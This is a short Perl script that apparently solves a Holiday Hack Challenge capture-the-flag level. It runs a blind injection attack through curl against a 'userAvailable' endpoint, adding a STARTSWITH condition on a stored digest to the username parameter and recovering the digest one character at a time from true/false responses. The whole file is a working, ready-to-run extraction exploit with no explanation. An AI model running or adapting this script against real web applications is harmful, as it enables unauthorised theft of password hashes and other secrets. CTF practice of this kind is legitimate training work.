#!/usr/bin/perl

my @list = split //, "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";  # charset
my $max_len = 20;

for (my $pos = 0; $pos < $max_len; $pos++) {
    	foreach my $ch (@list) {
		my $candidate = $prefix . $ch;

		#print "testing $candidate\n";
		$command = "curl -s \"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=bruce%22%20AND%20STARTSWITH(c.digest,%22$candidate%22)%20--&id=1d0a0f14-d70a-4ff7-b079-afedc4d04414\"";
		$run = `$command`;
		#print $run;
		chomp($run);
		if ($run =~ /false/i) {
            		print "[+] Found char $pos: $ch\n";
            		$prefix = $candidate;
            		print "string: $prefix\n";
            		$found = 1;
            	next;
        	}

    	}
}
